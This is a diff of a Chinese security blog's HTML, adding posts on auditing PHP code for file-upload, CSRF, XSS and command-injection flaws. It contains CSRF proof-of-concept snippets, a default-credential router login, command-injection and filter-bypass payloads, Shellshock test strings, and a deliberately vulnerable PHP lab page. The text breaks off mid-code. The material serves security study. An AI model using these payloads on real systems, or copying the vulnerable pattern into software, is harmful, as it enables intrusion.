+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/code/" itemprop="url" rel="index"><span itemprop="name">code</span></a></span>
 
                 
                 
@@ -1223,21 +1718,9 @@ SPN 是服务在使用 Kerbero
           
 
           
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
 
         </div>
       </header>
-    
 
     
     
@@ -1245,69 +1728,37 @@ SPN 是服务在使用 Kerbero
     <div class="post-body" itemprop="articleBody">
 
       
-      
+          <h3 id="php多文件上传"><a href="#php多文件上传" class="headerlink" title="php多文件上传"></a>php多文件上传</h3><p><a href="http://php.net/manual/zh/features.file-upload.multiple.php" target="_blank" rel="noopener">http://php.net/manual/zh/features.file-upload.multiple.php</a><br><a href="http://www.jb51.net/article/78767.htm" target="_blank" rel="noopener">http://www.jb51.net/article/78767.htm</a></p>
+<h3 id="PHP任意文件上传漏洞（CVE-2015-2348）"><a href="#PHP任意文件上传漏洞（CVE-2015-2348）" class="headerlink" title="PHP任意文件上传漏洞（CVE-2015-2348）"></a>PHP任意文件上传漏洞（CVE-2015-2348）</h3><p><a href="http://bobao.360.cn/news/detail/1383.html" target="_blank" rel="noopener">http://bobao.360.cn/news/detail/1383.html</a><br><a href="http://www.freebuf.com/vuls/62811.html" target="_blank" rel="noopener">http://www.freebuf.com/vuls/62811.html</a><br>加个\x00就截断了</p>
+<h3 id="上传绕过"><a href="#上传绕过" class="headerlink" title="上传绕过"></a>上传绕过</h3><h4 id="前端验证"><a href="#前端验证" class="headerlink" title="前端验证"></a>前端验证</h4><p>前端验证不是问题．burp抓包改包，或者直接把前端验证逻辑去掉．</p>
+<h4 id="后端验证"><a href="#后端验证" class="headerlink" title="后端验证"></a>后端验证</h4><ul>
+<li>MIME类型<br>即content-type(content-type 这个头部)<br>各类MIME类型：<br><a href="http://baike.sogou.com/v40102.htm?fromTitle=MIME" target="_blank" rel="noopener">http://baike.sogou.com/v40102.htm?fromTitle=MIME</a></li>
+<li></li>
+</ul>
 
-      
-        
-          
-          php多文件上传http://php.net/manual/zh/features.file-upload.multiple.phphttp://www.jb51.net/article/78767.htm
-PHP任意文件上传漏洞（CVE-2015-2348）http://bobao.360.cn/
-          ...
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2018/02/25/代码审计之文件上传/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
         
       
     </div>
-    
-    
-    
-    <div>
-      
-    </div>
-    
 
     
-
     
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
+    
+      <footer class="post-footer">
+          <div class="post-eof"></div>
+        
+      </footer>
   </div>
   
   
   
   </article>
 
-
     
-      
-
-  
-
+        <article itemscope itemtype="http://schema.org/Article">
   
   
   
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
+  <div class="post-block home">
     <link itemprop="mainEntityOfPage" href="http://hl0rey.github.io/2018/02/25/代码审计之csrf/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1319,53 +1770,46 @@ PHP任意文件上传漏洞（CVE-2015-2348）http://bobao.360.cn/
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
       <meta itemprop="name" content="hl0rey's blog">
     </span>
-
-    
       <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/02/25/代码审计之csrf/" itemprop="url">代码审计之csrf</a></h1>
-        
+        <h1 class="post-title" itemprop="name headline">
+            
+            <a href="/2018/02/25/代码审计之csrf/" class="post-title-link" itemprop="url">代码审计之csrf</a>
+          
+        </h1>
 
         <div class="post-meta">
-          <span class="post-time">
-            
+            <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="fa fa-calendar-o"></i>
               </span>
+              <span class="post-meta-item-text">Veröffentlicht am</span>
+
               
-                <span class="post-meta-item-text">发表于</span>
+                
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-02-25T21:20:45+08:00">
-                2018-02-25
-              </time>
-            
 
-            
-
-            
-          </span>
-
+              <time title="Erstellt: 2018-02-25 21:20:45" itemprop="dateCreated datePublished" datetime="2018-02-25T21:20:45+08:00">2018-02-25</time>
+            </span>
           
-            <span class="post-category" >
             
-              <span class="post-meta-divider">|</span>
+
             
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Bearbeitet am</span>
+                <time title="Geändert am: 2018-02-26 14:21:37" itemprop="dateModified" datetime="2018-02-26T14:21:37+08:00">2018-02-26</time>
+              </span>
+            
+          
+            <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="fa fa-folder-o"></i>
               </span>
+              <span class="post-meta-item-text">in</span>
               
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/code/" itemprop="url" rel="index">
-                    <span itemprop="name">code</span>
-                  </a>
-                </span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/code/" itemprop="url" rel="index"><span itemprop="name">code</span></a></span>
 
                 
                 
@@ -1374,21 +1818,9 @@ PHP任意文件上传漏洞（CVE-2015-2348）http://bobao.360.cn/
           
 
           
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
 
         </div>
       </header>
-    
 
     
     
@@ -1396,72 +1828,49 @@ PHP任意文件上传漏洞（CVE-2015-2348）http://bobao.360.cn/
     <div class="post-body" itemprop="articleBody">
 
       
-      
+          <h3 id="session与cookies"><a href="#session与cookies" class="headerlink" title="session与cookies"></a>session与cookies</h3><p>session的本质是cookies，这二者都是一种身份令牌，用来向服务器证明身份，以实现进行相关操作的时候进行隐式的身份认证．</p>
+<h3 id="csrf原理"><a href="#csrf原理" class="headerlink" title="csrf原理"></a>csrf原理</h3><p>核心在于关键的请求是可以伪造，被复用，不具有唯一性．一旦能够伪造正常请求则可能劫持正常用户．</p>
+<h3 id="csrf利用"><a href="#csrf利用" class="headerlink" title="csrf利用"></a>csrf利用</h3><ul>
+<li><p>GET型</p>
+<pre><code>&lt;img src=&quot;http://www.vulner.com/vul.php?buy=1&amp;id=1&quot; /&gt;
+</code></pre><p>  只要在一个页面里加上这段代码就可以了</p>
+</li>
+<li><p>POST型</p>
+<pre><code>&lt;form action=http://wooyun.org/csrf.php method=POST&gt;
+&lt;input type=&quot;text&quot; name=&quot;xx&quot; value=&quot;11&quot; /&gt;
+&lt;/form&gt;
+&lt;script&gt; document.forms[0].submit(); &lt;/script&gt; 
+</code></pre></li>
+<li><p>顺道破解弱口令型</p>
+<pre><code>&lt;img src=http://admin:admin@192.168.1.1 /&gt; 
+获得一个路由器的session
+接下来就可以配合csrf了．
+</code></pre></li>
+</ul>
 
-      
-        
-          
-          session与cookiessession的本质是cookies，这二者都是一种身份令牌，用来向服务器证明身份，以实现进行相关操作的时候进行隐式的身份认证．
-csrf原理核心在于关键的请求是可以伪造，被复用，不具有唯一性．一旦能够伪造正常请求则可能劫持正常用户．
-csrf利用
-GET型
-&lt;i
-          ...
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2018/02/25/代码审计之csrf/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
         
       
     </div>
-    
-    
-    
-    <div>
-      
-    </div>
-    
 
     
-
     
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
+    
+      <footer class="post-footer">
+          <div class="post-eof"></div>
+        
+      </footer>
   </div>
   
   
   
   </article>
 
-
     
-      
-
-  
-
+        <article itemscope itemtype="http://schema.org/Article">
   
   
   
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
+  <div class="post-block home">
     <link itemprop="mainEntityOfPage" href="http://hl0rey.github.io/2018/02/23/代码审计之XSS/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1473,53 +1882,46 @@ GET型
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
       <meta itemprop="name" content="hl0rey's blog">
     </span>
-
-    
       <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/02/23/代码审计之XSS/" itemprop="url">代码审计之XSS</a></h1>
-        
+        <h1 class="post-title" itemprop="name headline">
+            
+            <a href="/2018/02/23/代码审计之XSS/" class="post-title-link" itemprop="url">代码审计之XSS</a>
+          
+        </h1>
 
         <div class="post-meta">
-          <span class="post-time">
-            
+            <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="fa fa-calendar-o"></i>
               </span>
+              <span class="post-meta-item-text">Veröffentlicht am</span>
+
               
-                <span class="post-meta-item-text">发表于</span>
+                
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-02-23T18:45:18+08:00">
-                2018-02-23
-              </time>
-            
 
-            
-
-            
-          </span>
-
+              <time title="Erstellt: 2018-02-23 18:45:18" itemprop="dateCreated datePublished" datetime="2018-02-23T18:45:18+08:00">2018-02-23</time>
+            </span>
           
-            <span class="post-category" >
             
-              <span class="post-meta-divider">|</span>
+
             
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Bearbeitet am</span>
+                <time title="Geändert am: 2018-02-26 14:23:45" itemprop="dateModified" datetime="2018-02-26T14:23:45+08:00">2018-02-26</time>
+              </span>
+            
+          
+            <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="fa fa-folder-o"></i>
               </span>
+              <span class="post-meta-item-text">in</span>
               
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/code/" itemprop="url" rel="index">
-                    <span itemprop="name">code</span>
-                  </a>
-                </span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/code/" itemprop="url" rel="index"><span itemprop="name">code</span></a></span>
 
                 
                 
@@ -1528,21 +1930,9 @@ GET型
           
 
           
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
 
         </div>
       </header>
-    
 
     
     
@@ -1550,81 +1940,50 @@ GET型
     <div class="post-body" itemprop="articleBody">
 
       
-      
+          <h3 id="攻击的类型"><a href="#攻击的类型" class="headerlink" title="攻击的类型"></a>攻击的类型</h3><ul>
+<li><p>反射型XSS</p>
+<pre><code>服务器取得用户输入之后直接再浏览器输出    
+</code></pre></li>
+<li><p>存储型XSS</p>
+<pre><code>服务器取得用户输入之后，存储起来，再输出        
+</code></pre></li>
+<li><p>DOM型XSS</p>
+<pre><code>客户端利用DOM动态的改变页面内容，不经过服务器
+</code></pre></li>
+<li><p>Flash XSS</p>
+</li>
+</ul>
+<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p>XSS防御速查表<br><a href="http://www.freebuf.com/articles/web/156622.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/156622.html</a><br>XSS过滤绕过速查表<br><a href="http://www.freebuf.com/articles/web/153055.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/153055.html</a><br>xss利用技巧<br><a href="http://www.freebuf.com/articles/web/157589.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/157589.html</a></p>
+<h3 id="核心"><a href="#核心" class="headerlink" title="核心"></a>核心</h3><p>资料太多了．<br>审计的时候主要是看看可控变量在什么地方输出．<br>值得注意的是经过了实体编码也不能消除威胁的地方．</p>
+<h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>htmlspecialchars<br><a href="http://php.net/manual/zh/function.htmlspecialchars.php" target="_blank" rel="noopener">http://php.net/manual/zh/function.htmlspecialchars.php</a><br>如果不设置该函数的第二个参数的话，那么将不会转义引号，那么如果输出在标签内部，那么也是漏洞．<br>还可以利用宽字符．<br>而且支持的字符集有限，也是个突破口．</p>
+<h3 id="XSS利用"><a href="#XSS利用" class="headerlink" title="XSS利用"></a>XSS利用</h3><ul>
+<li>手工利用<br><a href="http://www.freebuf.com/sectool/159689.html" target="_blank" rel="noopener">http://www.freebuf.com/sectool/159689.html</a></li>
+<li>各种利用平台</li>
+</ul>
 
-      
-        
-          
-          攻击的类型
-反射型XSS
-服务器取得用户输入之后直接再浏览器输出    
-
-存储型XSS
-服务器取得用户输入之后，存储起来，再输出        
-
-DOM型XSS
-客户端利用DOM动态的改变页面内容，不经过服务器
-
-Flash XSS
-
-
-参考资料XSS防御速查表http://www.freebu
-          ...
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2018/02/23/代码审计之XSS/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
         
       
     </div>
-    
-    
-    
-    <div>
-      
-    </div>
-    
 
     
-
     
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
+    
+      <footer class="post-footer">
+          <div class="post-eof"></div>
+        
+      </footer>
   </div>
   
   
   
   </article>
 
-
     
-      
-
-  
-
+        <article itemscope itemtype="http://schema.org/Article">
   
   
   
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
+  <div class="post-block home">
     <link itemprop="mainEntityOfPage" href="http://hl0rey.github.io/2018/02/19/代码审计之命令执行/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1636,53 +1995,38 @@ Flash XSS
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
       <meta itemprop="name" content="hl0rey's blog">
     </span>
-
-    
       <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/02/19/代码审计之命令执行/" itemprop="url">代码审计之命令执行</a></h1>
-        
+        <h1 class="post-title" itemprop="name headline">
+            
+            <a href="/2018/02/19/代码审计之命令执行/" class="post-title-link" itemprop="url">代码审计之命令执行</a>
+          
+        </h1>
 
         <div class="post-meta">
-          <span class="post-time">
-            
+            <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="fa fa-calendar-o"></i>
               </span>
+              <span class="post-meta-item-text">Veröffentlicht am</span>
+
               
-                <span class="post-meta-item-text">发表于</span>
+                
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-02-19T15:36:11+08:00">
-                2018-02-19
-              </time>
-            
 
-            
-
-            
-          </span>
-
+              <time title="Erstellt: 2018-02-19 15:36:11 / Geändert am: 18:15:33" itemprop="dateCreated datePublished" datetime="2018-02-19T15:36:11+08:00">2018-02-19</time>
+            </span>
           
-            <span class="post-category" >
             
-              <span class="post-meta-divider">|</span>
+
             
+          
+            <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="fa fa-folder-o"></i>
               </span>
+              <span class="post-meta-item-text">in</span>
               
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/code/" itemprop="url" rel="index">
-                    <span itemprop="name">code</span>
-                  </a>
-                </span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/code/" itemprop="url" rel="index"><span itemprop="name">code</span></a></span>
 
                 
                 
@@ -1691,21 +2035,9 @@ Flash XSS
           
 
           
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
 
         </div>
       </header>
-    
 
     
     
@@ -1713,84 +2045,258 @@ Flash XSS
     <div class="post-body" itemprop="articleBody">
 
       
-      
+          <pre><code>有些时候，应用程序需要调用外部程序，这个时候就需要用到操作系统命令执行了．
+</code></pre><h3 id="涉及的函数"><a href="#涉及的函数" class="headerlink" title="涉及的函数"></a>涉及的函数</h3><ul>
+<li>system</li>
+<li>exec</li>
+<li>passthru</li>
+<li><p>shell_exec</p>
+</li>
+<li><p>``</p>
+<pre><code>反引号本质是调用shell_exec
+</code></pre><p>  当然，执行命令的办法并不是只能用php内置的函数，比如COM组件．</p>
+</li>
+</ul>
+<h3 id="自动化检测工具"><a href="#自动化检测工具" class="headerlink" title="自动化检测工具"></a>自动化检测工具</h3><pre><code>commix
+</code></pre><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><pre><code>在网站功能的实现中，可能需要直接调用操作系统命令，一般是为了调用外部程序，这种情况比较少，但还是存在的，为了执行命令而调用系统命令的基本不存在，比如，要调用一个程序来压缩图片，或者识别二维码。
 
-      
-        
-          
-          有些时候，应用程序需要调用外部程序，这个时候就需要用到操作系统命令执行了．
-涉及的函数
-system
-exec
-passthru
-shell_exec
+而操作系统的shell特性是允许同时执行多条命令的，依赖特殊的符号来声明有多条命令。Linux下是 | || &amp; &amp;&amp; ;$(shell命令) 还有反引号“ ` ”和$(shell命令)，用它包裹的字符串会被当作系统命令执行，这在php里和linux shell里是一致的。Windows下不支持反引号，别的符号都支持。
+</code></pre><h3 id="漏洞常见类型"><a href="#漏洞常见类型" class="headerlink" title="漏洞常见类型"></a>漏洞常见类型</h3><pre><code>代码层过滤不严
+系统漏洞
+第三方组件(例如 COM)
+</code></pre><h3 id="命令注入的判断方法："><a href="#命令注入的判断方法：" class="headerlink" title="命令注入的判断方法："></a>命令注入的判断方法：</h3><pre><code>分两种情况，有点像sql 注入，一种是有回显的命令执行，一种是没有回显的命令执行。
+有回显的命令执行判断起来十分简单，让命令额外输出一段十分特别的字符串，也就是说，正常不该输出这个字符串，例如afagagnjdghsuiiebgibqkio ，短一点就可以，这里只是举个例子。发送请求后，观察页面有没有出现这个字符串，如果出现了，也就是命令执行成功了。
+对于没有回显的，一可以基于响应时间来判断，比如在linux下 可以执行 sleep 5 ，睡眠任意的秒数，如果相应时间明显变长，如果不是延迟的锅，则可以判断是否存在命令注入。Windows下执行ping -n 127.0.0.1 &gt; 1 (大约五秒钟)，也可以用来判断。二是可以基于服务器的行为，用命令注入让服务器作出一个动作，比如linux可以 wget 一个ip地址或者网站或者是ping一个地址等，ip地址是你可以控制的网站，然后查看访问记录，如果有访问记录就可以认为存在命令注入，windows下用ping。
+</code></pre><h3 id="测试步骤："><a href="#测试步骤：" class="headerlink" title="测试步骤："></a>测试步骤：</h3><h4 id="1-安全等级一的时候，没有过滤任何特殊符号。想怎么注入怎么注入。"><a href="#1-安全等级一的时候，没有过滤任何特殊符号。想怎么注入怎么注入。" class="headerlink" title="1.安全等级一的时候，没有过滤任何特殊符号。想怎么注入怎么注入。"></a>1.安全等级一的时候，没有过滤任何特殊符号。想怎么注入怎么注入。</h4><p>Payload：<br>1）有回显的<br>| echo test 管道符，把前一个命令的输出作为后一个命令的输入<br>; echo test 分号表示一个命令的结束<br>-1 || echo test 此处逻辑运算符或，只有前面的命令执行失败才能执行后面的命令，所以这地方要故意把或符号前面的参数弄错，导致命令无法正常执行。<br>&amp; echo test<br>&amp;&amp; echo test 这两个与运算必须保证前一个命令能正常执行<br>2）无回显的<br>| sleep 5<br>; sleep 5<br>-1 || sleep 5<br>&amp; sleep 5<br>&amp;&amp; sleep 5<br>用别的判断方法只要把sleep 5 换成其他的命令就行了</p>
+<h4 id="2-安全等级2、3、4、6、7，都是没有过滤完全，只要不用被过滤的字符就可以了"><a href="#2-安全等级2、3、4、6、7，都是没有过滤完全，只要不用被过滤的字符就可以了" class="headerlink" title="2.安全等级2、3、4、6、7，都是没有过滤完全，只要不用被过滤的字符就可以了"></a>2.安全等级2、3、4、6、7，都是没有过滤完全，只要不用被过滤的字符就可以了</h4><p>例如使用 $(echo 2)</p>
+<h4 id="3-执行黑名单函数"><a href="#3-执行黑名单函数" class="headerlink" title="3.执行黑名单函数"></a>3.执行黑名单函数</h4><p>A）大小写绕过</p>
+<pre><code>Linux？不存在的
+操作系统特性，linux对大小写敏感，windows相反。
+Windows下可以用大小写来绕过比如把echo命令写成成Echo ECho。
+</code></pre><p>B）字符串拼接来执行命令</p>
+<pre><code>例如，执行echo
+a=&quot;ec&quot;;b=&quot;ho&quot;;$a$b 1;
+a=&apos;ec&apos;;b=&apos;ho&apos;;$a$b 1;
+a=&apos;ec&apos;&amp;b=&apos;ho&apos;&amp;$a$b 1;
+a=&apos;ec&apos;&amp;&amp;b=&apos;ho&apos;&amp;&amp;$a$b 1;
+`a=’ec’` `b=’ho’` `$a$b` 用反引号的，这个不常见
+</code></pre><p>C）编码绕过</p>
+<pre><code>编码这块我绕的头疼，先这样吧。
+Linux编码的命令有base64，#（用法：（进制数#数值）），或者用ascii码
+|| base64 echo | base64 -d 
+|| Cg== | base64 -d
+其他的类似只要把符合换换，命令换换
+进制转换来拼接命令非常有限，linux shell只能比较方便的最高支持16进制一下的转化，理论上来说只能执行由123456789abcdef 组成的命令（有待考证）
+Ascii码非常好用，一种是用printf 一种是用tr和od来结合实现，例如，
+字符转化为ascii码  echo &quot;A&quot;| tr -d &quot;\n&quot; | od -An -t dC
+分号可以替换为其他符号，下面这条命令会输出echo
+printf \\x`printf %x 101` ; printf \\x`printf %x 99`; printf \\x`printf %x 104`; printf \\x`printf %x 111` 
 
-``
-反引号本质是调用shell_exec
-  当然，执行命令的办法并不是只能用php内置的函数，比如COM组件．
+Windows cmd比较垃圾，好像没有什么编码
+</code></pre><h4 id="严格过滤之后的绕过"><a href="#严格过滤之后的绕过" class="headerlink" title="严格过滤之后的绕过"></a>严格过滤之后的绕过</h4><pre><code>经过安全等级8的严格过滤，看似已经不可能注入命令了。但是实际上还是有办法注入命令的。这里提到两种办法，一是宽字节注入，二是软件漏洞。
+一是宽字节注入，这个我暂时先停留在设想阶段- -。
+二是软件漏洞，值得一提的漏洞有shellshock和imagemagick解析漏洞
+Shellshock：
+                1).CVE-2014-6271 测试方式:
+                  env x=&apos;() { :;}; echo vulnerable&apos; bash -c &quot;echo this is a test&quot; 
+                   (2).CVE-2014-7169 测试方式:(CVE-2014-6271补丁更新后仍然可以绕过)
+                  env -i X=&apos;;() { (a)=&gt;\&apos; bash -c &apos;echo date&apos;; cat echo
+</code></pre><h3 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h3><pre><code>&lt;?php
+
+global $cmds;
+$cmds = &apos;&apos;;
+$servercmd = &apos;dir&apos;;
+$black = &apos;&apos;;
+
+//字符串替换函数详解
+
+//改变服务器执行的命令
+if (isset($_POST[&apos;servercmd&apos;])) {
+    $servercmd = $_POST[&apos;servercmd&apos;];
+}
+
+if ($_POST[&apos;lv&apos;] == 1) {
+//不做任何过滤
+    $cmds = $_POST[&apos;cmd&apos;];
+
+}
+if ($_POST[&apos;lv&apos;] == 2) {
+    //去掉特殊字符
+    $cmds = str_replace(array(&apos;&amp;&apos;, &apos;|&apos;,), &apos;&apos;, $_POST[&apos;cmd&apos;]);
+
+}
+if ($_POST[&apos;lv&apos;] == 3) {
+    //去掉特殊字符
+    $cmds = str_replace(array(&apos;&amp;&apos;, &apos;|&apos;, &apos;;&apos;), &apos;&apos;, $_POST[&apos;cmd&apos;]);
+
+}
+if ($_POST[&apos;lv&apos;] == 4) {
+    //去掉特殊字符
+    $cmds = str_replace(array(&apos;&amp;&apos;, &apos;|&apos;, &apos;;&apos;, &apos;||&apos;, &apos;&amp;&amp;&apos;), &apos;&apos;, $_POST[&apos;cmd&apos;]);
+
+}
+if ($_POST[&apos;lv&apos;] == 5) {
+    //代码书写错误，造成的绕过，多加了个空格导致过滤函数无效
+    $cmds = str_replace(array(&apos;&amp; &apos;, &apos;| &apos;, &apos;; &apos;, &apos;|| &apos;, &apos;&amp;&amp; &apos;), &apos;&apos;, $_POST[&apos;cmd&apos;]);
+}
+if ($_POST[&apos;lv&apos;] == 6) {
+    //去掉特殊字符
+    $cmds = str_replace(array(&apos;&amp;&apos;, &apos;|&apos;, &apos;;&apos;, &apos;||&apos;, &apos;&amp;&amp;&apos;, &apos;`&apos;), &apos;&apos;, $_POST[&apos;cmd&apos;]);
+
+}
+if ($_POST[&apos;lv&apos;] == 7) {
+    //去掉特殊字符
+    $cmds = str_replace(array(&apos;&amp;&apos;, &apos;|&apos;, &apos;;&apos;, &apos;||&apos;, &apos;&amp;&amp;&apos;, &apos;`&apos;,&apos;&gt;&apos;), &apos;&apos;, $_POST[&apos;cmd&apos;]);
+
+}
 
 
-自动化检测工具commix
-          ...
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2018/02/19/代码审计之命令执行/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
+if ($_POST[&apos;lv&apos;] == 8) {
+    //过滤了 # &amp; ; ` | * ? ~ &lt; &gt; ^ ( ) [ ] { } $ \\ \x0A \xFF
+    //在特殊符号之前加了转义符号 \
+    $cmds = escapeshellcmd($_POST[&apos;cmd&apos;]);
+}
+
+//把字符串转换为小写
+if ($_POST[&apos;case&apos;]==1){
+
+    $cmds=strtolower($cmds);//转为小写
+    //strtoupper();转为大写
+    //ucfirst(); 首字母大写
+    //ucwords(); 所有单词首字母大写
+}
+
+//过滤某个命令，基于黑名单
+if (isset($_POST[&apos;black&apos;])) {
+    $black = $_POST[&apos;black&apos;];
+    $cmds = str_replace($black, &apos;&apos;, $cmds);
+}
+
+
+?&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;style&gt;
+    div{
+    text-align: center;
+    }
+    &lt;/style&gt;
+    &lt;script src=&quot;jquery.js&quot;&gt;&lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+
+&lt;div id=&quot;center&quot;&gt;
+
+    &lt;form action=&quot;cmd.php&quot; method=&quot;post&quot;&gt;
+    &lt;div id=&quot;title&quot;&gt;命令注入&lt;/div&gt;
+    &lt;br&gt;
+    安全等级：&lt;select name=&quot;lv&quot;&gt;
+        &lt;option value=&quot;1&quot;&gt;1&lt;/option&gt;
+        &lt;option value=&quot;2&quot;&gt;2&lt;/option&gt;
+        &lt;option value=&quot;3&quot;&gt;3&lt;/option&gt;
+        &lt;option value=&quot;4&quot;&gt;4&lt;/option&gt;
+        &lt;option value=&quot;5&quot;&gt;5&lt;/option&gt;
+        &lt;option value=&quot;6&quot;&gt;6&lt;/option&gt;
+        &lt;option value=&quot;7&quot;&gt;7&lt;/option&gt;
+        &lt;option value=&quot;8&quot;&gt;8&lt;/option&gt;
+    &lt;/select&gt;&lt;br&gt;&lt;br&gt;
+    &lt;label&gt;函数黑名单：&lt;/label&gt;&lt;input type=&quot;text&quot; name=&quot;black&quot;&gt;&lt;br&gt;&lt;br&gt;
+    &lt;label&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;命令：&lt;/label&gt;&lt;input type=&quot;text&quot;
+                                                                                         name=&quot;servercmd&quot;
+                                                                                         value=&quot;dir&quot;&gt;&lt;br&gt;&lt;br&gt;
+    &lt;label&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;参数：&lt;/label&gt;&lt;input type=&quot;text&quot; name=&quot;cmd&quot;
+                                                                                         value=&quot;&quot;&gt;&lt;br&gt;&lt;br&gt;
+    &amp;nbsp;&amp;nbsp;
+    &lt;label&gt;是否开启大小写过滤：&lt;/label&gt;&lt;label&gt;&lt;input type=&quot;radio&quot; name=&quot;case&quot; value=&quot;1&quot;&gt;是&lt;/label&gt;&amp;nbsp;&amp;nbsp;&lt;label&gt;&lt;input type=&quot;radio&quot; name=&quot;case&quot; value=&quot;2&quot;&gt;否&lt;/label&gt;&lt;br&gt;
+    &lt;br&gt;&lt;input type=&quot;submit&quot; value=&quot;execute&quot;&gt;
+    &lt;/form&gt;
+&lt;/div&gt;
+&lt;div id=&quot;result&quot;&gt;
+    &lt;?php
+    //给了默认值了，是字符串所以这了进不来，直接构造数据包的时候这地方可以做校验
+    if (!isset($_POST[&apos;lv&apos;]) or !isset($_POST[&apos;cmd&apos;])) {
+    die(&apos; &lt;span id=&quot;tip&quot;&gt;
